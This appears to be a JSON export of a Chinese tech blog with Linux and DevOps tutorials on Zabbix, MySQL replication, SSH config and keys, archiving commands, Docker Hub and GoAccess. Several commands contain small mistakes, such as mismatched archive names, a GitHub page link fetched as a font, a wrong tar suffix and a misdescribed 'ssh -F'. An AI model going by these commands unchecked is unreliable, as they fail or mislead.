Zabbix 默认的用户名和密码是Admin、zabbix，顺利登录到后台之后，记得修改默认登录密码。 配置中文语言包如果需要设置中文版的环境，需要做一些额外的配置。 1$ vim &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;include&#x2F;locales.inc.php 将zh_CN 后面参数改为 true。 如果在选择语言时，发现还是不能选择，并且提示： You are not able to choose some of the languages, because locales for them are not installed on the web server. 这是因为你系统里没中文环境，查看当前的所有系统语言环境 1$ locale -a 1. 安装中文包1apt-get install language-pack-zh-hant language-pack-zh-hans 2. 配置环境变量增加语言和编码的设置： 1234# vim &#x2F;etc&#x2F;environmentLANG&#x3D;&quot;zh_CN.UTF-8&quot;LANGUAGE&#x3D;&quot;zh_CN:zh:en_US:en&quot; 3. 替换Zabbix 语言包12345$ cd cd &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;locale&#x2F;zh_CN&#x2F;LC_MESSAGES$ wget https:&#x2F;&#x2F;github.com&#x2F;echohn&#x2F;zabbix-zh_CN&#x2F;archive&#x2F;v0.1.0.zip$ unzip master.zip$ rm frontend.mo$ cp zabbix-zh_CN-master&#x2F;frontend.mo frontend.mo 4. 解决乱码问题12345$ wget https:&#x2F;&#x2F;github.com&#x2F;chenqing&#x2F;ng-mini&#x2F;blob&#x2F;master&#x2F;font&#x2F;msyh.ttf$ vim &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;include&#x2F;defines.inc.php# 找到 define(&#39;ZBX_GRAPH_FONT_NAME&#39;, &#39;graphfont&#39;);# 将graphfont 替换成 msyh 5. 更新mibs 库1$ apt-get install snmp-mibs-downloader 6. 重启服务1$ systemctl restart zabbix-server zabbix-agent php7.2-fpm 至此Zabbix 的完整部署过程就全介绍完了。 参考链接 Zabbix 3.0 for Ubuntu 14.04 LTS 安装 下载安装Zabbix——Zabbix 官网 企业级分布式监控系统–zabbix","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"https://www.0x2beace.com/categories/Linux/Zabbix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Zabbix","slug":"Zabbix","permalink":"https://www.0x2beace.com/tags/Zabbix/"},{"name":"监控系统","slug":"监控系统","permalink":"https://www.0x2beace.com/tags/%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/"}]},{"title":"Zabbix 快速上手——添加Agent 主机","slug":"zabbix-add-agent-host","date":"2020-09-04T13:48:16.000Z","updated":"2020-09-08T13:03:21.864Z","comments":true,"path":"zabbix-add-agent-host/","link":"","permalink":"https://www.0x2beace.com/zabbix-add-agent-host/","excerpt":"Zabbix-Server 安装完成之后，下一步需要添加主机才能看到数据。","text":"Zabbix-Server 安装完成之后，下一步需要添加主机才能看到数据。 安装Zabbix AgentZabbix Agent 的作用是将服务器的数据发送给 Zabbix Server，所以只需要在需要监控的主机上安装 Zabbix Agent 就够了。 因为我的环境是：Ubuntu 18.04、Nginx、Mysql、PHP，根据官网的选择对应的下载链接。 在有了Mysql 和 Nginx的情况下，这里我只选择安装 Zabbix Agent，如果没有的话，那就需要额外安装zabbix-mysql、zabbix-nginx-conf、zabbix-frontend-php。 1234$ wget https:&#x2F;&#x2F;repo.zabbix.com&#x2F;zabbix&#x2F;5.0&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;z&#x2F;zabbix-release&#x2F;zabbix-release_5.0-1+bionic_all.deb$ dpkg -i zabbix-release_5.0-1+bionic_all.deb$ apt update$ apt install zabbix-agent 配置 Zabbix Agent12345# vim &#x2F;etc&#x2F;zabbix&#x2F;zabbix_agentd.confServer：Zabbix Server 的IP 地址ServerActive：Zabbix Server 的IP 地址Hostname：Zabbix Agent 这台主机的别名 核心的配置只有这三行，改完之后，重启以下 Zabbix Agent。 1$ systemctl restart zabbix-agent 添加主机完成以上配置之后，下一步需要做的就是打开 Zabbix 的Web 端，开始添加主机。 配置主机基础信息： 主机名称：zabbix_agentd.conf 中的Hostname 客户端IP：需要监控的主机的IP 地址 端口默认使用 10050 配置模版： 需要注意的是，如果没有配置模版，可能会导致没有数据。 然后点击添加即可。 打开监控面板，点击主机，正常情况下，主机状态应该是这样的。 至此就完成了Agent 的添加，点击最新数据或者图形可以看到相应的数据。 参考链接 安装zabbix-agent并添加到zabbix web中监控 Zabbix 使用 Zabbix-Agent 添加新的Linux服务器监控","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"https://www.0x2beace.com/categories/Linux/Zabbix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Zabbix","slug":"Zabbix","permalink":"https://www.0x2beace.com/tags/Zabbix/"}]},{"title":"Mysql 主从架构配置","slug":"mysql-master-slave-architecture-configuration","date":"2020-09-03T15:40:16.000Z","updated":"2020-09-03T15:43:51.804Z","comments":true,"path":"mysql-master-slave-architecture-configuration/","link":"","permalink":"https://www.0x2beace.com/mysql-master-slave-architecture-configuration/","excerpt":"Mysql 主从配置是数据库同步的必要步骤。","text":"Mysql 主从配置是数据库同步的必要步骤。 主机环境： Ubuntu 18.04 LTS Mysql 5.7 下面会将主数据库简称为Master，从数据库简称为 Slave。 配置Master1234567# vim &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf# 打开二进制日志[mysqld]server_id&#x3D;1log-bin&#x3D;master-binlog-bin-index&#x3D;master-bin.index 创建同步用户，并赋予权限（如果从服务器以reql 这个账号进行连接，就赋予同步数据库的权限，并且这个权限是所有数据库的所有数据表） 1234$ mysql -uroot -p mysql&gt; create user repl;mysql&gt; grant replication slave on *.* to &#39;user&#39;@&#39;your_slave_addr&#39; identified by &#39;password&#39;mysql&gt; flush privileges; 上面的IP 是指 Slave 服务器的IP 地址。重启Mysql 服务。 查看Master 配置： 1mysql&gt; show master status; Salve 配置1234567# vim &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf# 打开relay 日志[mysqld]server_id&#x3D;2relay-log-index&#x3D;slave-relay-bin.indexrelay-log&#x3D;slave-relay-bin 重启Mysql 服务。 指定Master 主机 12$ mysql -uroot -pmysql&gt; change master to master_host&#x3D;&quot;your master ip &quot;, master_port&#x3D;3306, master_user&#x3D;&#39;repl&#39;,master_password&#x3D;&#39;password&#39;,master_log_file&#x3D;&#39;master-bin.000001&#39;,master_log_pos&#x3D;0; 参数说明： master_host：Master∑主机的外网IP 地址 master_port：端口 master_user：Master主机上进行同步的用户 master_password：密码 master_log_file：Master 输出的二进制文件的名称（在Master 主机上使用show master status命令查看） master_log_pos：哪里开始同步 开启主从同步 1mysql&gt; start slave; 查看从库同步状态 1mysql&gt; show slave status; 可能会遇到的问题 Last_Errno: 1146 Last_Error: Error executing row event: ‘Table ‘panda.t’ doesn’t exist’ 解决办法：使用slave-skip-errors 参数跳过该错误。 1234# vim &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf[mysqld]slave_skip_errors&#x3D;1146 重启从库即可。","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"了解 SSH Config","slug":"understand-ssh-config","date":"2020-09-02T15:58:02.000Z","updated":"2020-09-02T15:58:54.842Z","comments":true,"path":"understand-ssh-config/","link":"","permalink":"https://www.0x2beace.com/understand-ssh-config/","excerpt":"很早就接触到了SSH，起初并不知道有ssh config这样一个东西存在，基本上是摸着石头过河，中间遇到过不少问题，走过不少弯路。 最后总结出来了两个解决办法，今天无意间发现原来其中有一个这么好用的工具一直都被我忽略了。","text":"很早就接触到了SSH，起初并不知道有ssh config这样一个东西存在，基本上是摸着石头过河，中间遇到过不少问题，走过不少弯路。 最后总结出来了两个解决办法，今天无意间发现原来其中有一个这么好用的工具一直都被我忽略了。 什么是SSH Config 先决条件：在使用ssh 之前，需要先安装好Openssh、SSH1或者是SSH2。（Linux、Mac用户请忽略） ~/.ssh/config 是通过ssh 连接远程服务器时使用的配置文件。 为什么要使用SSH Config例如：使用SSH 进行远程连接，一般会这样做： 1$ ssh Boo@18.182.201.142 在简单地连接情况下，它并不麻烦。但是当端口号不是默认值（22）时，当密钥对不是默认名称时，连接就变得复杂了。 12345678# 指定端口连接$ ssh Boo@18.182.201.142 -p 2222# 非默认名称密钥认证$ ssh -i ~&#x2F;.ssh&#x2F;id_rsa_aliyun Boo@18.182.201.142# 以上两种情况综合$ ssh -i ~&#x2F;.ssh&#x2F;id_rsa_aliyun Boo@18.182.201.142 -p 2222 此时，使用ssh config就变得很有用了。 123456# vim ~&#x2F;.ssh&#x2F;configHost aliyun HostName 18.182.201.142 Port 2222 User Boo IdentityFile ~&#x2F;.ssh&#x2F;id_rsa_aliyun 现在在连接使用如下命令： 1$ ssh aliyun 是不是非常的方便！就算此时手上有多台服务器需要管理，只要配置好对应的~/.ssh/config参数，就可以很轻松的进行连接了。 但需要注意的是：有关ssh 的配置不能分成多个文件，只能写在这一个文件中~/.ssh/config（如果你有更好的办法）。 SSH 的配置文件同样适用于其他程序，如：scp，sftp等。 常用的配置选项配置文件格式 空行和以’＃’开头的行是注释。 每行以关键字开头，后跟参数。 配置选项可以用空格或可选的空格分隔，只需要一个=。 参数可以用双引号（”）括起来，以指定包含空格的参数。 常用关键字SSH Config 的关键字不区分大小写，但是参数区分大小写。 Host：可以理解为远程主机名的别名，最终指明这个名称进行连接，如：ssh aliyun HostName：需要远程连接的主机名，通常都是IP。 Port：指定连接端口 User：指定连接用户 IdentityFile：指明远程连接密钥文件 注：Host 关键字可以包含以下模式匹配： *- 匹配零个或多个字符。例如，Host 将匹配所有主机，同时`192.168.0.匹配192.168.0.0/24`子网中的所有主机。 ? - 恰好匹配一个字符。该模式Host 10.10.0.?将匹配10.10.0.[0-9]范围内的所有主机。 !- 在模式的开头将否定其匹配例如，Host 10.10.0.* !10.10.0.5将匹配10.10.0.0/24子网中的任何主机，除了10.10.0.5。 配置文件加载顺序 全局配置文件：/etc/ssh/ssh_config 用户配置文件：~/.ssh/config ssh 客户端按以下优先顺序读取其配置： 从命令行指定的选项 用户的ssh 配置文件 全局的ssh 配置文件 如果希望SSH 客户端忽略ssh 配置文件中指定的所有选项，可以使用： 1$ ssh -F user@example.com 恢复连接常用SSH 的小伙伴可能都知道，使用SSH 连接到远程服务器之后，如果一段时间没有输入任何指令，很有可能会断开与服务器的连接，需要重连就会变得很麻烦。 此时，ssh config 又变得很有用了。 123456＃定期向服务器发送实时报告（每60秒，可以自定义）ServerAliveInterval 60# 如果想要针对某个连接单独使用，需要放在Host 指令下，全局则放在最头部Host aliyun ServerAliveInterval 60 可能感兴趣的内容 如何在Linux 中更改SSH 端口 关于 ~/.ssh/config 使用 SSH 配置文件 ssh_config 指令详解 SSH 官网 OpenSSH 客户端SSH 配置文件","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Cygwin 快速上手","slug":"cygwin-quick-start","date":"2020-09-01T14:16:25.000Z","updated":"2020-09-03T15:47:42.934Z","comments":true,"path":"cygwin-quick-start/","link":"","permalink":"https://www.0x2beace.com/cygwin-quick-start/","excerpt":"在很早之前就听说过Cygwin和MinGW64这两个东西，只是当时不是很理解这两个东西是做什么的，还经常和msysGit 搞混淆，加上最近用MinGW64用的很不顺手，所以打算安装一个Cygwin。","text":"在很早之前就听说过Cygwin和MinGW64这两个东西，只是当时不是很理解这两个东西是做什么的，还经常和msysGit 搞混淆，加上最近用MinGW64用的很不顺手，所以打算安装一个Cygwin。 区别与联系首先来介绍下这三者分别是什么。 CygwinCygwin是一个类似Unix的环境和Microsoft Windows命令行界面。 大量GNU和开源工具，提供类似于 Windows上的 Linux发行版的功能。用官网的话说就是：在Windows 上获取Linux 的感觉。 MinGW64MSYS(MSYS | MinGW) 是一个在 Windows 下的类Unit工作环境。因为 Git 里面包含很多 Shell 跟 Perl 脚本，所以它(Git)需要一个这样的环境。 每次右键打开Git Bash时，其终端就是MinGW64 msysGitmsysGit是一个构建环境，其中包含希望通过为Git for Windows编写代码来贡献所需的所有工具。 所以，Git for Windows 可以在 Windows 上安装可运行 Git 的最小环境，而 msysGit 是构建 Git for Windows 所需的环境。 安装Cygwin安装Cygwin 的过程比MinGW 要复杂些，其中主要需要注意的是模块部分。 Cygwin 好用的原因很大程度上是因为其功能之丰富，而各种功能则是来自于其模块。 终于安装好了，感觉很厉害的样子，是我想要的东西，希望在今后的日子中 能和它好好相处。 Mintty是一个终端仿真器 用于Cygwin的， MSYS或 Msys2 和衍生的项目，以及用于WSL。 参考链接 从Windows 运行下载Cygwin64 Cygwin 是什么，不是什么？–官网 Cygwin 安装教程 详细","categories":[{"name":"终端","slug":"终端","permalink":"https://www.0x2beace.com/categories/%E7%BB%88%E7%AB%AF/"}],"tags":[{"name":"Cygwin","slug":"Cygwin","permalink":"https://www.0x2beace.com/tags/Cygwin/"},{"name":"终端","slug":"终端","permalink":"https://www.0x2beace.com/tags/%E7%BB%88%E7%AB%AF/"}]},{"title":"Linux 压缩、解压、打包详解","slug":"detailed-explanation-of-linux-compression-decompression-and-packaging","date":"2020-08-31T15:47:15.000Z","updated":"2020-09-17T12:51:47.804Z","comments":true,"path":"detailed-explanation-of-linux-compression-decompression-and-packaging/","link":"","permalink":"https://www.0x2beace.com/detailed-explanation-of-linux-compression-decompression-and-packaging/","excerpt":"在Linux 中，解压、压缩、打包是日常会很频繁用到的几个操作，但是因为参数很多，没有记忆点，加上压缩文件的类型很多，如果不经常使用，是真的容易忘记。","text":"在Linux 中，解压、压缩、打包是日常会很频繁用到的几个操作，但是因为参数很多，没有记忆点，加上压缩文件的类型很多，如果不经常使用，是真的容易忘记。 所以这篇笔记就是用来整理常见的那些解压、压缩、打包的命令。 在正式学习之前，需要明确的两个概念，打包和压缩不是一回事： 打包：是指将一大堆文件或目录变成一个总的文件。 压缩：则是将一个大文件通过压缩算法变成一个小文件。 为什么要区分这两个概念呢？这源于Linux 中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。 tar压缩/打包仅打包，不压缩。 1tar -cvf foo.tar foo foo.tar这个文件名是自定义的，只是习惯上我们使用 .tar 作为包文件。 打包，且压缩。-z参数表示以 .tar.gz 或者 .tgz 后缀名代表 gzip 压缩过的 tar 包。 1tar -zcvf foo.tar.gz foo 打包，且压缩。-j 参数表示以 .tar.bz2 后缀名作为tar包名。 1tar -jcvf foo.tar.gz foo 解压在当前目录下直接解压： 1tar -zxvf foo.tar.gz 注意，如果这个目录下有同名的文件，不会询问，直接覆盖。 解压至指定文件夹： 1tar -zxvf foo.tar.gz -C &lt;dir name&gt; gzipgzip 命令用来压缩文件。文件经它压缩过后，其名称后面会多处 .gz 扩展名（不带 .tar）。 压缩将当前目录的每个文件压缩成.gz文件： 1gzip * 递归压缩指定目录的所有文件及子目录： 1gzip -r &lt;dir name&gt; 解压解压当前目录下的foo.gz 文件： 1gzip -d foo.gz 解压完成之后，foo.gz 就变成了 foo 文件。 递归解压目录： 1gzip -dr &lt;dir name&gt; 解压完成之后，&lt;dir name&gt; 目录下的所有 .gz 文件都会变成正常文件。 zipzip 可以用来解压缩文件，或者对文件进行打包操作。文件经它压缩后会另外产生具有 .zip 扩展名的压缩文件。 压缩将当前目录下的指定目录，压缩为 .zip文件： 1zip -q -r foo.zip &lt;dir name&gt; 将指定目录下的所有文件及其文件夹，压缩为.zip 文件： 1zip -q -r foo.zip &#x2F;&lt;path to dir&gt; 注意，产生的压缩文件在执行命令的那个目录下。 解压unzip 命令用于解压缩由 zip 命令压缩的 .zip压缩包。 查看压缩包内容： 1unzip -v foo.zip 将压缩文件在指定目录下解压缩，如果已有相同的文件存在，要求 unzip命令不覆盖原先的文件。 1unzip -n foo.zip -d &#x2F;&lt;file to dir&gt; 将压缩文件在当前目下解压，如果已有相同的文件，不询问，直接覆盖。 1unzip -o foo.zip 总结Linux 下的压缩解压其实并不复杂，只是不常用的情况下，很容器忘记。 如果你不知道在什么场景下，该使用什么命令，可以参照： 如果只有一个大文件，可以使用 gzip 或者 zip命令。 如果是一个完整的目录，里面有很多子目录以及文件，可以使用tar命令。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Docker Hub 快速上手","slug":"docker-hub-quick-start","date":"2020-08-30T10:32:02.000Z","updated":"2020-08-30T10:35:11.952Z","comments":true,"path":"docker-hub-quick-start/","link":"","permalink":"https://www.0x2beace.com/docker-hub-quick-start/","excerpt":"最近将常使用的镜像放在了Docker 仓库（Docker Hub）上。GitHub 是托管代码的地方，而Docker Hub 则是托管镜像的地方。","text":"最近将常使用的镜像放在了Docker 仓库（Docker Hub）上。GitHub 是托管代码的地方，而Docker Hub 则是托管镜像的地方。 目前大部分需求都可以直接在 Docker Hub 中下载镜像来实现，如果想使用自己仓库中的镜像，那么需要先注册一个账号。 创建仓库想要从 Docker Hub 使用自己的镜像之前，首先得创建一个仓库，然后将目标镜镜像 push 到该仓库。 这个仓库可以是公开的也可以是私有的，这个并不影响你正常使用。 创建成功之后，就可以看到该仓库了。 发布镜像在发布之前，确保你本地存在目标镜像，可以使用 docker images来查看： 123$ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEadminer latest c3588b6003bb 3 weeks ago 90.4MB 创建 Tag： 12345# 语法docker tag local-image:tagname new-repo:tagname# 实例docker tag adminer:latest hoooliday&#x2F;runfast:adminer 前面的 tagname 是本地镜像的标签名称，后面的tagname 是该镜像在仓库中的标签名称。 再次查看本地镜像： 123$ docker imageshoooliday&#x2F;runfast adminer c3588b6003bb 3 weeks ago 90.4MBadminer latest c3588b6003bb 3 weeks ago 90.4MB 发布镜像： 12345# 语法docker push new-repo:tagname# 实例docker push hoooliday&#x2F;runfast:adminer 发布成功之后，可以打开 Docker Hub 在 Repositories 的列表中就看到刚才的镜像了。 拉取镜像首先需要在命令行中登录你的 docker hub 账号： 1$ docker login 拉取自己的镜像，这里以 adminer 这个镜像为例： 1234docker run --link mysql:mysql --name adminer \\-d --restart&#x3D;always \\-p 8006:8080 \\hoooliday&#x2F;runfast:adminer 唯一需要注意的就是最后一行，如果想要使用官方最新版本的 adminer ，那就直接写成 adminer，但如果想要使用自己的镜像，那就需要写成 username/repo:tagname 的格式。 查看本地所有镜像： 12$ docker imageshoooliday&#x2F;runfast adminer c3588b6003bb 3 weeks ago 90.4MB 此持就完成了Docker 镜像的发布和拉取了，当然这只是 Docker Hub 所有功能中的冰山一角。","categories":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/categories/Docker/"},{"name":"Tutorial","slug":"Docker/Tutorial","permalink":"https://www.0x2beace.com/categories/Docker/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"},{"name":"Docker Hub","slug":"Docker-Hub","permalink":"https://www.0x2beace.com/tags/Docker-Hub/"}]},{"title":"Linux 如何生成密钥对进行 ssh 免密登录","slug":"how-to-generate-a-key-pair-for-ssh-login-without-password","date":"2020-08-29T03:46:41.000Z","updated":"2020-08-29T03:47:53.463Z","comments":true,"path":"how-to-generate-a-key-pair-for-ssh-login-without-password/","link":"","permalink":"https://www.0x2beace.com/how-to-generate-a-key-pair-for-ssh-login-without-password/","excerpt":"最近因为项目快要上线了，服务器从测试环境转到了生产环境，登录方式也从原来的密码认证替换成了密钥认证。","text":"最近因为项目快要上线了，服务器从测试环境转到了生产环境，登录方式也从原来的密码认证替换成了密钥认证。 这么做的目的是为了防止服务器密码被暴力破解。 ssh 是什么？ ssh 是一种协议，它可以基于密码进行认证，也可以基于密钥去认证用户。 生成密钥对这里我们使用 RSA 类型的加密类型来创建密钥对。 1ssh-keygen -f ~&#x2F;.ssh&#x2F;your_key_name -f 参数表示指定密钥对生成位置与名称 密钥对通常放在 $HOME/.ssh 目录下 回车即可创建密钥对，如果不需要为密钥对进行加密，那么可以一路回车。 创建成功之后，可以看到 .ssh 目录下多了两个文件，分别是： your_key：密钥对的私钥，通常放在客户端。 your_key.pub：密钥对中的公钥，通常放在服务端。 将本地的公钥传到服务器上注意：这里是将your_key.pub 公钥文件上传至你需要连接的服务器，而不是your_key私钥文件。 1ssh-copy-id -i ~&#x2F;.ssh&#x2F;your_key.pub user@&lt;ip address&gt; -pport -i 参数表示使用指定的密钥，-p参数表示指定端口，ssh 的默认端口是 22，如果没有更改默认端口，则可以省略。 这里需要输入一次密码进行确认，如果成功之后，会看到以下内容： 本地的公钥文件上传在服务器的哪里？ 在该用户的.ssh/authorized_keys 文件中。 1cat ~&#x2F;.ssh&#x2F;authorized_keys 通过密钥对进行免密登录现在我们可以使用以下命令登录到服务器中了： 1ssh -p port -i ~&#x2F;.ssh&#x2F;your_key user@&lt;ip address&gt; 不出意外，就可以不用输入密码而直接成功登录了。 如果你仍然需要输入密码或者遇到其他问题了，可以从以下方向进行排查。 常见问题： 如果没有使用默认的密钥名称（id_rsa），则在连接主机时需要加上-i 参数，指定对应密钥的名称。否则由于默认私钥与远程主机中的自定义公钥不匹配，自然无法基于密钥进行认证，会再次提示你输入密码。 服务端的$HOME/.ssh目录的正常权限是700，服务端$HOME/.ssh/authorized_keys文件的权限默认为600。 上传密钥时使用的是：公钥（.pub），进行密钥认证时使用的是：私钥。 配置ssh config上面的命令虽然可以实现免密登录，但是命令太长了，就算是复制粘贴也有可能会出错。 那有没有什么好的办法，解决这个问题呢？ 当然是有的啦。 在$HOME/.ssh 目录下，创建一个名为config的文件。 1vim $HOME&#x2F;.ssh&#x2F;conifg 加入以下配置： 123456Host alias User user HostName ip address Port port IdentityFile ~&#x2F;.ssh&#x2F;your_key ServerAliveInterval 360 参数说明： Host：可以理解成别名，配置完成之后，最后就通过 ssh alias 进行登录。 User：远程主机的用户名称 HostName：远程主机的地址 Port：端口号 IdentityFile：私钥文件的路径 ServerAliveInterval：保持客户端与服务端会话在短时间内不会断开。 当然，如果你是使用ssh 客户端，那就不用配置这些。 禁用通过密码认证如果上面的配置都无误，可以正常通过密钥进行免密登录，那么最后需要做的一件事情就是关闭服务端的通过密码进行身份认证。 1234vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config# 将yes 改为 noPasswordAuthentication yes 然后重启 sshd 服务。 1service sshd restart 以上就是有关如何用自定义的密钥对进行免密认证的全部过程了。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"SSH","slug":"SSH","permalink":"https://www.0x2beace.com/tags/SSH/"},{"name":"SSHD","slug":"SSHD","permalink":"https://www.0x2beace.com/tags/SSHD/"}]},{"title":"命名规范——程序员的自我修养","slug":"naming-convention-programmer-s-self-cultivation","date":"2020-08-28T13:36:57.000Z","updated":"2020-08-28T13:40:17.879Z","comments":true,"path":"naming-convention-programmer-s-self-cultivation/","link":"","permalink":"https://www.0x2beace.com/naming-convention-programmer-s-self-cultivation/","excerpt":"之所以会有这样一篇笔记呢，是因为在各种不同的场景下，面临命名这件事情，有时候会犯迷糊，不知道该如何选择正确的方式命名。所以这篇笔记的目的就是为解决这个问题。","text":"之所以会有这样一篇笔记呢，是因为在各种不同的场景下，面临命名这件事情，有时候会犯迷糊，不知道该如何选择正确的方式命名。所以这篇笔记的目的就是为解决这个问题。 命名规范命名规范包含了：目录、文件、变量、函数命名。值得一提的是：命名规则没有谁对谁错，在项目中保持一致才是关键。 混乱或错误的命名不仅让我们对代码难以理解，更糟糕的是，会误导我们的思维，导致对代码的理解完全错误。相反，良好的命名，则可以让我们的代码非常容易读懂，也能向读者正确表达事物以及逻辑的本质，从而使得代码的可维护性就大大增强，读命名好的文章是非常流畅的，会有一种享受的感觉。 目录因为Windows，OSX 下文件夹不区分大小写，Linux 是区分的。所以在文件夹的命名上面，建议全部用小写。可以包含下划线(_)或连字符(-)。如果没有约定，(_)更好。 文件文件的命名也是推荐和目录的连字符保持一致。Linux 文件系统推荐的文件命名是下划线(_)。 类类型名称通常使用大写驼峰命名法 12class MyClass ... 类成员不管是静态还是非静态，类数据成员的命名都可以和普通变量一样，采用驼峰命名法： 123456789class MyClass &#123; public $myVariable; public static $myStaticVariable; public function myFunction($firstWord, $secondWord)&#123; &#x2F;&#x2F;方法中的参数名推荐使用小驼峰命名法 ... &#125;;&#125; 一般名称的前缀都是有第一规律的，如is（判断）、get（得到），set（设置）。 变量变量的命名有两种方式： 下划线命名法：my_variable 小驼峰命名法：myVariable 但通常还是推荐使用，下划线命名法（全是小写）。 不同的语言也是有不同的规范，例如JavaScript 变量推荐驼峰命名法，CSS 推荐连字符(-)。 常量、全局常量常量和全局常量通常使用全大写和下划线的方式来命名，例如： 12const MY_CONSTANT;define(&quot;DEFAULT_NUM&quot;, 10); 特殊变量12345&#x2F;&#x2F;引用变量&#x2F;&#x2F;静态变量&#x2F;&#x2F;全局变量 函数命名函数的命名使用下划线命名法： 123function my_function()&#123; ...&#125; 补充说明函数和方法的区别：函数是一段可以重用的代码块，方法是在类里面的函数。 参考链接： PHP 命名规范 如何优雅的为变量和函数命名 命名约定 | Google开源项目风格指南 命名规范 | 程序员的自我修养","categories":[{"name":"碎碎念","slug":"碎碎念","permalink":"https://www.0x2beace.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}],"tags":[{"name":"碎碎念","slug":"碎碎念","permalink":"https://www.0x2beace.com/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}]},{"title":"日志分析工具 - GoAccess","slug":"log-analysis-tool-goaccess","date":"2020-08-27T14:59:41.000Z","updated":"2020-11-09T00:28:06.901Z","comments":true,"path":"log-analysis-tool-goaccess/","link":"","permalink":"https://www.0x2beace.com/log-analysis-tool-goaccess/","excerpt":"日志的重要性不言而喻，可我似乎完全忽略了它，导致往往出现什么问题，第一时间并不是去看日志。","text":"日志的重要性不言而喻，可我似乎完全忽略了它，导致往往出现什么问题，第一时间并不是去看日志。 很显然我完全忽视了它的强大性，就拿 nginx 的访问日志来说，可以从中分析出如下信息： 请求的响应时间 请求达到的后端服务器的地址和端口 请求是否存在缓存配置 请求体、请求头、响应体和响应头的大小等 客户端的IP 地址、UserAgent 等信息 自定义变量的内容 通过这些信息，可以得到响应耗时的请求以及请求量和并发量，从而分析并发原因，这对于应用级别的服务来说是非常重要的。 GoAccess 是什么GoAccess 是一个开源的实时网络日志分析器和交互式查看器，可以在类 Unix 系统中的终端或通过浏览器运行。 —— GoAccess 官方 为什么选择 GoAccess？ 因为GoAccess 被设计成一个基于终端的快速日志分析器。它的核心思想是实时快速分析和查看Web服务器统计信息，而无需使用浏览器。同时也可以将输入到HTML 或者 CSV、JSON。 GoAccess几乎可以解析任何Web日志格式（Apache，Nginx，Amazon S3，Elastic Load Balancing，CloudFront等）。只需要设置日志格式并根据您的日志运行它。 GoAccess 入门昨天在使用 GoAccess 时，踩到了一些坑，导致我一度认为这个工具是不是存在什么Bug。因为在看别人的教程中都是开箱即用。 下面从安装到使用会一一详细说明。 安装 GoAccess因为服务器的操作系统是 Ubuntu，所以这里以 Ubuntu为例： 因为并非所有发行版都提供最新版本的 GoAccess，所以这里使用官方提供的最新稳定版的安装方式 1234$ echo &quot;deb http:&#x2F;&#x2F;deb.goaccess.io&#x2F; $（lsb_release -cs）main&quot; | sudo tee -a &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;goaccess.list$ wget -O - https:&#x2F;&#x2F;deb.goaccess.io&#x2F;gnugpg.key | sudo apt-key add - $ sudo apt-get update$ sudo apt-get install goaccess 确定日志格式在计算机安装了GoAccess 之后，要做的第一件事情就是确定访问日志的日志格式，可以在永久设置它们，也可以通过命令行传递他们。 这里用Nginx 的 access.log 为例 136.113.128.155 - - [28&#x2F;Apr&#x2F;2019:02:20:01 +0000] &quot;GET &#x2F;Manage&#x2F;Dingdan&#x2F;fail_index&#x2F;startTime&#x2F;2019-04-28+00%3A00%3A00&#x2F;endTime&#x2F;2019-04-28+23%3A59%3A59.html HTTP&#x2F;1.1&quot; 200 7798 &quot;http:&#x2F;&#x2F;www.692213.com&#x2F;Manage&#x2F;Dingdan&#x2F;fail_index&#x2F;startTime&#x2F;2019-04-28+00%3A00%3A00&#x2F;endTime&#x2F;2019-04-28+23%3A59%3A59.html&quot; &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;70.0.3538.110 Safari&#x2F;537.36&quot; 方式一，配置.goaccessrc文件： 12345vim ~&#x2F;.goaccessrctime-format %Tdate-format %d&#x2F;%b&#x2F;%Ylog_format %h %^[%d:%t %^] &quot;%r&quot; %s %b &quot;%R&quot; &quot;%u&quot; %^ 方式二，在命令行传递参数： 1$ goaccess nginx&#x2F;access.log --log-format&#x3D;&#39;%h %^[%d:%t %^] &quot;%r&quot; %s %b &quot;%R&quot; &quot;%u&quot; %^&#39; --date-format&#x3D;%d&#x2F;%b&#x2F;%Y --time-format&#x3D;%T 注意：无论是配置文件还是命令行参数 